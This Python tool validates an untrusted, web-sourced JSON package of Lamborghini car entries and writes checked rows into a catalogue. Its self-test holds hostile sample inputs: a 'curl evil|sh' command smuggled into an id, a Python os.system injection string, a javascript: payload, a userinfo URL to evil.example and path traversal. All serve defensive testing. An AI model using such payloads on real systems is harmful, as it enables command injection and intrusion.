"""Check the Scout's monthly package and turn it into catalogue rows (tools/REFRESH.md, Dev).

The package is untrusted data written by a chat that read the open web (Cyber's spec, 2026-11-11).
This script never evaluates, executes or imports package text, never opens a URL from it and runs
no shell. It writes rows only as repr() of values that passed every check, verifies them with the
AST, then runs `python3 -I` on the edited catalogue. Any violation rejects the whole package.

  python3 tools/scout_import.py check  PKG.json   # validate only
  python3 tools/scout_import.py apply  PKG.json   # validate, then write rows to tools/catalog.py
  python3 tools/scout_import.py photos PKG.json   # after your own images.py/flickr.py runs: apply
                                                  # drop/hero picks found in those runs only
  python3 tools/scout_import.py report PKG.json   # Markdown for the PR body (package text fenced)
  python3 tools/scout_import.py --self-test       # Cyber's hostile cases a-j on a scratch copy

Package ("version": 1): one UTF-8 JSON object of at most 64 KB, keys exactly as below at every level.
{
  "version": 1,
  "window": ["2026-11-01", "2026-12-01"],          # ISO dates searched, from <= to <= today
  "cars": [                                          # at most 20
    {"id": "temerario-gt3", "family": "Temerario", "name": "Temerario GT3", "kind": "Race car",
     "year": 2026, "end": 0, "body": "Coupé", "engine": "4.0 L twin-turbo V8", "eng": "V8",
     "cv": null, "units": null, "designer": "Lamborghini Centro Stile", "wiki": null,
     "note": "One line.", "cats": ["Lamborghini Temerario GT3"],
     "perf": null,                                   # Production/Limited series/One-off only:
                                                     # [top km/h, over?, 0-100 s or null]
     "sources": ["https://en.wikipedia.org/wiki/..."]}  # 1-5, hosts in SOURCE_HOSTS; never opened
  ],
  "photos": {"temerario-gt3": {"drop": ["Some photo.jpg", "flickr:123"], "hero": null}},
  "notes": "One line for the PR: teasers skipped, doubts."
}
A car whose id already exists is a blank-fill: every field equals today's row except fields that are
None today (perf: only if the car has no PERF entry yet). New ids go at the end of CARS. A new family
is allowed only if its key is also its display name (nothing to add to FAMILY_NAME or FAMILY_WORDS).
"""
import ast, datetime, json, os, re, shutil, subprocess, sys, tempfile, unicodedata, urllib.parse

ROOT = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
CATALOG = os.path.join(ROOT, "tools", "catalog.py")
HEROES = os.path.join(ROOT, "data", "heroes.json")
APP = os.path.join(ROOT, "src", "app.js")
MAX_BYTES = 64 * 1024
MAX_CARS = 20
FIELDS = ["id", "family", "name", "kind", "year", "end", "body", "engine", "eng", "cv", "units",
          "designer", "cats", "wiki", "note"]          # E(...) argument order in catalog.py
CAR_KEYS = set(FIELDS) | {"perf", "sources"}
TOP_KEYS = {"version", "window", "cars", "photos", "notes"}
PERF_KINDS = {"Production", "Limited series", "One-off"}
SOURCE_HOSTS = {"en.wikipedia.org", "www.autocar.co.uk", "www.caranddriver.com", "www.motor1.com",
                "www.topgear.com", "www.evo.co.uk", "www.carscoops.com"}
ID_RE = re.compile(r"[a-z0-9-]{2,40}")
FAMILY_RE = re.compile(r"[A-Za-z0-9 ]{2,30}")
TEXT_BAD = set("<>{}[]|\\`")
CAT_BAD = set("<>[]{}|#")
TEXT_BAD_WORDS = ("__li_", "javascript:", "http")
INVISIBLE = {*range(0x200B, 0x2010), *range(0x202A, 0x202F), *range(0x2066, 0x206A), 0xFEFF}


class Bad(Exception):
    pass


def read_order(name):
    m = re.search(r"const %s = \[([^\]]*)\]" % name, open(APP, encoding="utf-8").read())
    return re.findall(r"'([^']*)'", m.group(1))


def one_line(v, where, limit, bad):
    if type(v) is not str or not 1 <= len(v) <= limit:
        raise Bad(f"{where}: must be a string of 1-{limit} characters")
    if unicodedata.normalize("NFC", v) != v:
        raise Bad(f"{where}: not NFC-normalised")
    for ch in v:
        cat = unicodedata.category(ch)
        if ch in bad or cat[0] == "C" or cat in ("Zl", "Zp") or ord(ch) in INVISIBLE:
            raise Bad(f"{where}: character U+{ord(ch):04X} not allowed")
    return v


def text(v, where, limit=200):
    one_line(v, where, limit, TEXT_BAD)
    low = v.lower()
    for w in TEXT_BAD_WORDS:
        if w in low:
            raise Bad(f"{where}: may not contain '{w}'")


def integer(v, where, lo, hi, none=True):
    if v is None and none:
        return
    if type(v) is not int or not lo <= v <= hi:        # type() is int: rejects True/False and floats
        raise Bad(f"{where}: must be an integer {lo}-{hi}" + (" or null" if none else ""))


def source(v, where):
    if type(v) is not str or len(v) > 300 or any(not 33 <= ord(c) <= 126 for c in v) or "`" in v:
        raise Bad(f"{where}: must be printable ASCII, at most 300 characters")
    u = urllib.parse.urlsplit(v)
    try:
        port = u.port
    except ValueError:
        port = "bad"
    if u.scheme != "https" or "@" in u.netloc or port is not None or u.hostname not in SOURCE_HOSTS:
        raise Bad(f"{where}: must be https on one of {sorted(SOURCE_HOSTS)}")


def strict_keys(obj, keys, where):
    if type(obj) is not dict:
        raise Bad(f"{where}: must be an object")
    if set(obj) != keys:
        raise Bad(f"{where}: unexpected keys {sorted(set(obj) - keys)}, missing {sorted(keys - set(obj))}")


def load(path):
    if os.path.getsize(path) > MAX_BYTES:
        raise Bad(f"package larger than {MAX_BYTES} bytes")
    try:
        s = open(path, "rb").read().decode("utf-8")
    except UnicodeDecodeError:
        raise Bad("package is not UTF-8")

    def pairs(kv):
        keys = [k for k, _ in kv]
        if len(keys) != len(set(keys)):
            raise Bad(f"duplicate keys: {sorted({k for k in keys if keys.count(k) > 1})}")
        return dict(kv)

    def const(c):
        raise Bad(f"{c} is not allowed")

    def num(x):
        f = float(x)
        if f != f or f in (float("inf"), float("-inf")):
            raise Bad(f"number {x[:20]} is out of range")
        return f
    try:
        return json.loads(s, object_pairs_hook=pairs, parse_constant=const, parse_float=num)
    except ValueError as e:
        raise Bad(f"not valid JSON: {e}")


def load_catalog(path=CATALOG):
    """CARS and PERF read with the AST (literals, plus the module's shorthand string constants), so
    checking a package runs no code."""
    tree = ast.parse(open(path, encoding="utf-8").read())
    names, cars, perf = {}, {}, {}
    for node in tree.body:
        if isinstance(node, ast.Assign) and len(node.targets) == 1 and isinstance(node.targets[0], ast.Name):
            n = node.targets[0].id
            if isinstance(node.value, ast.Constant):
                names[n] = node.value.value
            elif n == "PERF":
                perf = ast.literal_eval(node.value)
            elif n == "CARS":
                for call in node.value.elts:
                    args = [names[a.id] if isinstance(a, ast.Name) else ast.literal_eval(a) for a in call.args]
                    row = dict(zip(FIELDS, args + [None] * (len(FIELDS) - len(args))))
                    if not isinstance(row["cats"], list):
                        row["cats"] = [row["cats"]]
                    row["note"] = row["note"] or ""
                    cars[row["id"]] = (row, call)
    return cars, perf


def validate(pkg, cat_path=CATALOG):
    cars, perf = load_catalog(cat_path)
    kinds, engs = read_order("KIND_ORDER"), read_order("ENG_ORDER")
    today = datetime.date.today()
    errs = []

    strict_keys(pkg, TOP_KEYS, "package")
    if type(pkg["version"]) is not int or pkg["version"] != 1:
        raise Bad("version must be 1")
    w = pkg["window"]
    try:
        if type(w) is not list or len(w) != 2 or not all(type(d) is str and len(d) == 10 for d in w):
            raise ValueError
        a, b = map(datetime.date.fromisoformat, w)
        if a > b or b > today:
            raise ValueError
    except ValueError:
        errs.append("window: two ISO dates, from <= to <= today")
    if pkg["notes"] != "":
        try:
            text(pkg["notes"], "notes", 300)
        except Bad as e:
            errs.append(str(e))
    if type(pkg["cars"]) is not list or len(pkg["cars"]) > MAX_CARS:
        raise Bad(f"cars: a list of at most {MAX_CARS}")

    seen = set()
    for i, c in enumerate(pkg["cars"]):
        where = f"cars[{i}]"
        try:
            strict_keys(c, CAR_KEYS, where)
            if type(c["id"]) is not str or not ID_RE.fullmatch(c["id"]):
                raise Bad(f"{where}.id: must match ^[a-z0-9-]{{2,40}}$")
            if c["id"] in seen:
                raise Bad(f"{where}.id: twice in the package")
        except Bad as x:
            errs.append(str(x))
            continue
        seen.add(c["id"])
        where = f"car {c['id']}"
        e = []

        def chk(fn, *a):
            try:
                fn(*a)
            except Bad as x:
                e.append(str(x))
        if type(c["family"]) is not str or not FAMILY_RE.fullmatch(c["family"]):
            e.append(f"{where}.family: must match ^[A-Za-z0-9 ]{{2,30}}$")
        if c["kind"] not in kinds:
            e.append(f"{where}.kind: one of {kinds}")
        if c["eng"] not in engs:
            e.append(f"{where}.eng: one of {engs}")
        chk(integer, c["year"], f"{where}.year", 1963, today.year + 1, False)
        if type(c["end"]) is not int or c["end"] != 0:
            chk(integer, c["end"], f"{where}.end", c["year"] if type(c["year"]) is int else 1963, today.year + 1)
        chk(integer, c["cv"], f"{where}.cv", 50, 2500)
        chk(integer, c["units"], f"{where}.units", 1, 100000)
        for f in ("name", "body", "engine", "note"):
            chk(text, c[f], f"{where}.{f}")
        for f in ("designer", "wiki"):
            if c[f] is not None:
                chk(text, c[f], f"{where}.{f}")
        cats = c["cats"]
        if type(cats) is not list or not 1 <= len(cats) <= 3:
            e.append(f"{where}.cats: 1-3 Commons category names")
        else:
            for j, k in enumerate(cats):
                chk(one_line, k, f"{where}.cats[{j}]", 150, CAT_BAD)
        p = c["perf"]
        if p is not None:
            if not (type(p) is list and len(p) == 3 and type(p[0]) is int and 150 <= p[0] <= 500
                    and type(p[1]) is bool and (p[2] is None or (type(p[2]) in (int, float) and 1.5 <= p[2] <= 15))):
                e.append(f"{where}.perf: [top km/h 150-500, over true/false, 0-100 s 1.5-15 or null]")
            if c["kind"] not in PERF_KINDS:
                e.append(f"{where}.perf: only for {sorted(PERF_KINDS)}")
        src = c["sources"]
        if type(src) is not list or not 1 <= len(src) <= 5:
            e.append(f"{where}.sources: 1-5 links")
        else:
            for j, u in enumerate(src):
                chk(source, u, f"{where}.sources[{j}]")
        if c["id"] in cars and not e:          # blank-fill of an existing row
            old = cars[c["id"]][0]
            changed = [f for f in FIELDS if c[f] != old[f]]
            for f in changed:
                if old[f] is not None:
                    e.append(f"{where}.{f}: differs from today's row, which is not blank there")
                elif c[f] is None:
                    pass
            new_perf = p is not None and c["id"] not in perf
            if p is not None and c["id"] in perf and perf_value(p) != perf[c["id"]]:
                e.append(f"{where}.perf: the car already has figures")
            if not changed and not new_perf and not e:
                e.append(f"{where}: an existing car with nothing to fill")
        errs.extend(e)

    ph = pkg["photos"]
    if type(ph) is not dict:
        errs.append("photos: must be an object")
    else:
        for cid, v in ph.items():
            where = f"photos.{cid}"
            try:
                if cid not in cars and cid not in seen:
                    raise Bad(f"{where}: unknown car id")
                strict_keys(v, {"drop", "hero"}, where)
                if type(v["drop"]) is not list or len(v["drop"]) > 20:
                    raise Bad(f"{where}.drop: a list of at most 20 titles")
                for j, t in enumerate(v["drop"] + ([v["hero"]] if v["hero"] is not None else [])):
                    one_line(t, f"{where} title {j}", 200, TEXT_BAD)
            except Bad as x:
                errs.append(str(x))
    if errs:
        raise Bad("\n".join(errs))
    return pkg


def perf_value(p):
    return (p[0], p[1], None if p[2] is None else float(p[2]))


def row_source(c):
    return (f"    E({', '.join(repr(c[f]) for f in FIELDS[:12])},\n"
            f"      {', '.join(repr(c[f]) for f in FIELDS[12:])}),\n")


def apply(pkg, cat_path=CATALOG):
    src = open(cat_path, encoding="utf-8").read()
    cars, perf = load_catalog(cat_path)
    lines = src.splitlines(keepends=True)
    starts = [0]
    for l in lines:
        starts.append(starts[-1] + len(l))

    def pos(lineno, col):          # ast columns are UTF-8 byte offsets
        return starts[lineno - 1] + len(lines[lineno - 1].encode("utf-8")[:col].decode("utf-8"))
    tree = ast.parse(src)
    top = {n.targets[0].id: n.value for n in tree.body
           if isinstance(n, ast.Assign) and isinstance(n.targets[0], ast.Name)}
    edits, new_rows, new_perf = [], "", ""
    for c in pkg["cars"]:
        if c["id"] in cars:
            old, call = cars[c["id"]]
            for k, f in enumerate(FIELDS):
                if c[f] == old[f]:
                    continue
                node = call.args[k] if k < len(call.args) else None
                if not (isinstance(node, ast.Constant) and node.value is None):
                    raise Bad(f"{c['id']}.{f}: no literal None to fill in catalog.py; do it by hand")
                edits.append((pos(node.lineno, node.col_offset), pos(node.end_lineno, node.end_col_offset), repr(c[f])))
        else:
            new_rows += row_source(c)
        if c["perf"] is not None and c["id"] not in perf:
            new_perf += f"    {c['id']!r}: {perf_value(c['perf'])!r},\n"
    for node, add in ((top["CARS"], new_rows), (top["PERF"], new_perf)):
        if add:   # just before the closing bracket's line
            close = pos(node.end_lineno, node.end_col_offset) - 1
            at = src.rindex("\n", 0, close) + 1
            edits.append((at, at, add))
    for a, b, new in sorted(edits, key=lambda x: x[0], reverse=True):
        src = src[:a] + new + src[b:]
    tmpd = tempfile.mkdtemp()
    tmp = os.path.join(tmpd, "catalog.py")
    try:
        with open(tmp, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(src)
        # Verify with the AST before writing: every package value is back, and only as a literal.
        got, gperf = load_catalog(tmp)
        if set(got) != set(cars) | {c["id"] for c in pkg["cars"]}:
            raise Bad("unexpected rows after the edit")
        before = sum(isinstance(n, (ast.Import, ast.ImportFrom, ast.FunctionDef)) for n in ast.walk(tree))
        after = sum(isinstance(n, (ast.Import, ast.ImportFrom, ast.FunctionDef)) for n in ast.walk(ast.parse(src)))
        if before != after:
            raise Bad("the edit added code")
        for c in pkg["cars"]:
            row, call = got[c["id"]]
            if c["id"] not in cars and not all(isinstance(a, (ast.Constant, ast.List)) for a in call.args):
                raise Bad(f"{c['id']}: written row is not all literals")
            if row != {f: c[f] for f in FIELDS}:
                raise Bad(f"{c['id']}: round trip failed")
            if c["perf"] is not None and c["id"] not in perf and gperf.get(c["id"]) != perf_value(c["perf"]):
                raise Bad(f"{c['id']}: PERF round trip failed")
        r = subprocess.run([sys.executable, "-I", tmp], capture_output=True, text=True, timeout=60)
        if r.returncode:
            raise Bad("python3 -I catalog.py failed:\n" + r.stderr[-2000:])
        shutil.copyfile(tmp, cat_path)
    finally:
        shutil.rmtree(tmpd)
    new = [c["id"] for c in pkg["cars"] if c["id"] not in cars]
    print(f"catalog.py: {len(new)} rows added, {len(pkg['cars']) - len(new)} rows filled, "
          f"{new_perf.count(chr(10))} PERF entries")
    if new:
        print("next: python3 tools/images.py --only " + ",".join(new))


def own_photos():
    own = {}
    for name in ("images.json", "flickr.json"):
        p = os.path.join(ROOT, "data", name)
        if os.path.exists(p):
            for cid, entry in json.load(open(p, encoding="utf-8")).items():
                own.setdefault(cid, set()).update(x["t"] for x in entry.get("images", []))
    return own


def photos(pkg, own=None, heroes_path=HEROES):
    """Apply drop/hero picks only for photos the Dev's own runs put in images.json/flickr.json."""
    own = own_photos() if own is None else own
    h = json.load(open(heroes_path, encoding="utf-8"))
    ignored = []
    for cid, v in pkg["photos"].items():
        mine = own.get(cid, set())
        for t in v["drop"]:
            if t not in mine:
                ignored.append(f"drop {cid}: {t!r} is not in your own run")
            elif t not in h["drop"].get(cid, []):
                h["drop"].setdefault(cid, []).append(t)
        t = v["hero"]
        if t is not None:
            if t not in mine or t in h["drop"].get(cid, []):
                ignored.append(f"hero {cid}: {t!r} is not among your run's kept photos")
            else:
                h["hero"][cid] = t
    with open(heroes_path, "w", encoding="utf-8", newline="\n") as fh:
        json.dump(h, fh, ensure_ascii=False, indent=1)
    print("heroes.json updated; now look at every photo yourself (tools/REFRESH.md, Dev step 4).")
    for s in ignored:
        print("ignored (report it):", s)
    return ignored


def report(pkg):
    out = ["Scout package (untrusted text, quoted as code):", "", "```text",
           f"window {pkg['window'][0]} to {pkg['window'][1]}"]
    for c in pkg["cars"]:
        out.append(f"{c['id']} | {c['name']} | {c['kind']} | {c['year']}")
        out += [f"    {u}" for u in c["sources"]]
    if pkg["notes"]:
        out.append("notes: " + pkg["notes"])
    out.append("```")
    print("\n".join(out))


def self_test():
    """Cyber's hostile cases a-j, on a scratch copy of catalog.py and heroes.json."""
    good = {"id": "zz-self-test", "family": "Temerario", "name": "Self Test", "kind": "Limited series",
            "year": 2026, "end": 0, "body": "Coupé", "engine": "4.0 L V8", "eng": "V8", "cv": 900,
            "units": None, "designer": None, "wiki": None, "note": "A note.",
            "cats": ["Lamborghini Self Test"], "perf": [340, False, 2.7],
            "sources": ["https://en.wikipedia.org/wiki/Lamborghini"]}
    base = {"version": 1, "window": ["2026-10-01", "2026-11-01"], "cars": [good], "photos": {}, "notes": ""}
    one = lambda **kw: dict(base, cars=[dict(good, **kw)])
    some_id = next(iter(load_catalog()[0]))
    js = json.dumps(base)
    cases = {
        "b newline": one(note="a\nb"), "b CR": one(note="a\rb"), "b bidi": one(note="a‮b"),
        "b zero-width": one(note="a​b"), "c comment-script": one(note="<!--<script x"),
        "c __LI_APP__": one(note="__LI_APP__"), "c javascript:": one(note="javascript:alert(1)"),
        "c template": one(note="{{u|x}}"), "d shell id": one(id="a,b;curl evil|sh"),
        "d path id": one(id="../x"), "d capital id": one(id="Miura"), "d existing id": one(id=some_id),
        "e year true": one(year=True), "e year string": one(year="1971"), "e year float": one(year=1971.5),
        "e year NaN": js.replace('"year": 2026', '"year": NaN'),
        "e year 1e400": js.replace('"year": 2026', '"year": 1e400'),
        "e cv -1": one(cv=-1), "e cv 99999": one(cv=99999),
        "f kind": one(kind="Hypercar"), "f eng": one(eng="W16"),
        "g duplicate key": js.replace('"version": 1', '"version": 1, "version": 1'),
        "g extra key": dict(base, exec="x"), "g extra car key": one(exec="x"),
        "h http": one(sources=["http://en.wikipedia.org/wiki/X"]),
        "h lamborghini.com": one(sources=["https://www.lamborghini.com/x"]),
        "h userinfo": one(sources=["https://en.wikipedia.org@evil.example/"]),
        "j over 64 KB": js + " " * MAX_BYTES,
        "j 21 cars": dict(base, cars=[dict(good, id=f"zz-{i}") for i in range(21)]),
    }
    tmpd = tempfile.mkdtemp()
    cat, pk = os.path.join(tmpd, "catalog.py"), os.path.join(tmpd, "p.json")

    def run(p):
        with open(pk, "w", encoding="utf-8") as fh:
            fh.write(p if isinstance(p, str) else json.dumps(p, ensure_ascii=False))
        shutil.copy(CATALOG, cat)
        pkg = validate(load(pk), cat)
        apply(pkg, cat)
        return pkg
    fails = []
    try:
        for name, p in cases.items():
            try:
                run(p)
                fails.append(f"{name}: accepted")
            except Bad:
                pass
        evil = "x'); import os; os.system('id') #"         # (a) must import as an inert string
        run(one(note=evil))
        row, call = load_catalog(cat)[0]["zz-self-test"]
        if row["note"] != evil or not isinstance(call.args[14], ast.Constant):
            fails.append("a: not an inert string constant")
        hp = os.path.join(tmpd, "heroes.json")               # (i) titles not in your own run
        shutil.copy(HEROES, hp)
        pkg = dict(base, photos={"zz-self-test": {"drop": ["Mine.jpg", "Not mine.jpg"], "hero": "flickr:1"}})
        ign = photos(pkg, own={"zz-self-test": {"Mine.jpg"}}, heroes_path=hp)
        h = json.load(open(hp, encoding="utf-8"))
        if len(ign) != 2 or h["drop"].get("zz-self-test") != ["Mine.jpg"] or "zz-self-test" in h["hero"]:
            fails.append("i: picks outside your own run were applied")
    finally:
        shutil.rmtree(tmpd)
    for f in fails:
        print("FAIL", f)
    print("self-test " + ("FAILED" if fails else f"OK: {len(cases)} hostile packages rejected, "
                          "(a) imported as an inert string, (i) picks outside your run ignored"))
    return not fails


def main():
    if sys.argv[1:] == ["--self-test"]:
        sys.exit(0 if self_test() else 1)
    if len(sys.argv) != 3 or sys.argv[1] not in ("check", "apply", "photos", "report"):
        sys.exit(__doc__.split("\n\n")[1])
    try:
        pkg = load(sys.argv[2])
        if sys.argv[1] in ("check", "apply"):
            validate(pkg)
            if sys.argv[1] == "check":
                print(f"package OK: {len(pkg['cars'])} cars, photo picks for {len(pkg['photos'])} cars")
            else:
                apply(pkg)
        else:
            # After apply the rows exist, so validate against main's catalogue instead of today's file.
            base = subprocess.run(["git", "-C", ROOT, "show", "origin/main:tools/catalog.py"],
                                  capture_output=True, text=True, check=True).stdout
            with tempfile.TemporaryDirectory() as d:
                p = os.path.join(d, "catalog.py")
                with open(p, "w", encoding="utf-8") as fh:
                    fh.write(base)
                validate(pkg, p)
            (photos if sys.argv[1] == "photos" else report)(pkg)
    except Bad as e:
        sys.exit("package rejected:\n" + str(e))


if __name__ == "__main__":
    main()
